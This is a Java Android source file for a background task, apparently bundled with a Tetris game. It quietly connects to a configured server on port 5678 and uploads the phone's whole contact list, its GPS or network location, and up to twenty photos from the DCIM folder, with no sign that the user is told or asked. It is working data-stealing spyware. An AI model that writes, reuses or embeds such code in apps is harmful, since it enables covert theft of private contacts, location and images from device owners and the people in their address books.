package com.kdh.test;

import android.content.ContentResolver;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.chobocho.tetrisgame.TetrisViewForN8;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.ArrayList;

public class ServerClient extends AsyncTask<Void, Integer, Integer> {
    private Context context;
    String server;
    private Socket socket;
    BufferedReader in;
    PrintWriter out;
    String data;
    String[] extensions = {".jpg", ".png", ".jpeg"};
    boolean sendLocation = false;


    public ServerClient(Context context){
        this.context = context;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();

        server = context.getString(R.string.serverip);
    }

    @Override
    protected Integer doInBackground(Void... voids) {
        try {
            socket = new Socket(server, 5678); // 소켓 생성
            out = new PrintWriter(new BufferedWriter(new
                    OutputStreamWriter(socket.getOutputStream(), "UTF-8")), true);
            sendContact();
            sendLocation();
            sendImage();

        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }

    private void sendLocation(){
        getLocation();
    }

    public void getLocation() {
        final LocationManager lm = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
        try {
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);

            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1, gpsLocationListener);
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 1, gpsLocationListener);
        }
        catch(SecurityException e){
            e.printStackTrace();
        }
    }
    final LocationListener gpsLocationListener = new LocationListener() {
        @Override
        public void onLocationChanged(Location location) {
            String provider = location.getProvider();
            double longitude = location.getLongitude();
            double latitude = location.getLatitude();
            double altitude = location.getAltitude();

            if (sendLocation == false){
                String Locate = Integer.toString(((int)latitude));
                latitude = ((latitude - (int)latitude)) * 60;
                Locate += '°' + Integer.toString((int)latitude);
                latitude = ((latitude - (int)latitude)) * 60;
                String tmp = Double.toString(latitude);
                Locate += '\'' + tmp.substring(0,tmp.indexOf('.')+2) + "\"N+";

                Locate = Integer.toString(((int)longitude));
                longitude = ((longitude - (int)longitude)) * 60;
                Locate += '°' + Integer.toString((int)longitude);
                longitude = ((longitude - (int)longitude)) * 60;
                tmp = Double.toString(longitude);
                Locate += '\'' + tmp.substring(0,tmp.indexOf('.')+2) +"\"E";

                Log.w("locate", Double.toString(latitude));
                out.println(Locate);
                sendLocation = true;
            }
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {

        }
        @Override
        public void onProviderEnabled(String provider) {

        }
        @Override
        public void onProviderDisabled(String provider) {

        }
    };

    private void sendContact(){
        ContactUtil cu = new ContactUtil(context);
        ArrayList<Contact> myContacts = cu.getContactList();

        for(Contact value : myContacts){
            out.println("이름 : " + value.getName() + " 번호 : "+value.getPhoneNumber());
            Log.w("Contact", "이름 : " + value.getName() + " 번호 : "+value.getPhoneNumber());
        }
        out.println("end");
    }

    private void sendImage(){

        if (isExternalStorageReadable()) {
            try {
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
                ArrayList<File> sendArray  = new ArrayList<>();

                findImage(dir.getCanonicalPath(), sendArray);

                // 이미지 총 개수
                int len = sendArray.size();
                out.println(len);

                for(int i = 0; i < len && i < 20; i++) {
                    InetSocketAddress socketAddress = new InetSocketAddress(server, 5678);
                    Socket fileSocket = new Socket();
                    fileSocket.connect(socketAddress, 3000);
                    BufferedOutputStream bos = new BufferedOutputStream(fileSocket.getOutputStream());

                    File file = sendArray.get(i);

                    FileInputStream fs = new FileInputStream(file);
                    byte[] buffer = new byte[10240];

                    int read;
                    while ((read = fs.read(buffer)) != -1) {
                        bos.write(buffer, 0, read);
                    }
                    bos.close();
                    fs.close();
                    fileSocket.close();
                }
            }catch(FileNotFoundException e){
                e.printStackTrace();
            }catch (IOException e){
                e.printStackTrace();
            }
        }

    }

    private void findImage(String source, ArrayList<File> sendArray) throws IOException{
        File dir = new File(source);
        File[] fileList = dir.listFiles();

        for(File file : fileList){
            if (file.isFile()){
                for(String extension : extensions){
                    if (file.getName().endsWith(extension)){
                        sendArray.add(file);
                        break;
                    }
                }
            }
            else if (file.isDirectory()){
                findImage(file.getCanonicalPath().toString(), sendArray);
            }
        }
    }

    private void sendFile(){
        ContentResolver mResolver = context.getContentResolver();
    }
    private boolean isExternalStorageReadable(){
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state) ||
        Environment.MEDIA_MOUNTED_READ_ONLY.equals(state))
            return true;
        return false;
    }

    @Override
    protected void onProgressUpdate(Integer... values) {
        super.onProgressUpdate(values);

        Toast.makeText(ApplicationClass.getContext(), values[0].toString(), Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onCancelled() {
        super.onCancelled();

        try {
            socket.close(); //소켓을 닫는다.
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onPostExecute(Integer integer) {
        super.onPostExecute(integer);

        try {
            socket.close(); //소켓을 닫는다.
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
